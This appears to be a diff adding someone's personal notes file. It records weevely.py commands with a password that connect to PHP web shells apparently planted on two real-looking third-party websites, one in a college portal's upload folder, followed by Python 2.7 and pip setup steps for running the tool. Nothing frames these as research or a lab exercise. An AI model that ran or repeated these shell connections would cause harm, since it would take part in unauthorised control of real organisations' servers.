@@ -1,0 +1,15 @@
+SidSid
+weevely.py http://nationalonline.co.in/images/file/1663440793_weevely.php SidSid
+weevely.py https://nilambazarcollege.ac.in/portal/TDC/secured/TDC3upload/404.php SidSid
+
+https://www.python.org/downloads/release/python-2718/
+Env
+C:\Users\myall\AppData\Local\Programs\Python\Python310\Scripts\
+C:\Users\myall\AppData\Local\Programs\Python\Python310\
+
+Turn Off App Execution Aliases
+install PIP 
+cd C:\Python27\Scripts
+easy_install pip
+pip install pyreadline pyyaml
+
